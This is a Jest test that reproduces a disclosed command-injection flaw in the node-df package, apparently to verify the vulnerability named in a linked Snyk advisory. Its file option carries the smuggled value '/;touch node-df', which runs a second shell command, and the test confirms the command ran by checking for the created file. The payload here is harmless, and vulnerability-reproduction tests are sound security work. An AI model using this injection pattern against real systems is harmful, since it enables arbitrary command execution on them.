//https://snyk.io/vuln/SNYK-JS-NODEDF-536779
test("Command Injection in node-df", () => {
  const df = require("node-df");
  const fs = require("fs");
  const path = "./node-df";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  let options = {
    file: "/;touch node-df",
    prefixMultiplier: "GB",
    isDisplayPrefixMultiplier: true,
    precision: 2,
  };

  df(options, function (error, response) {});

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
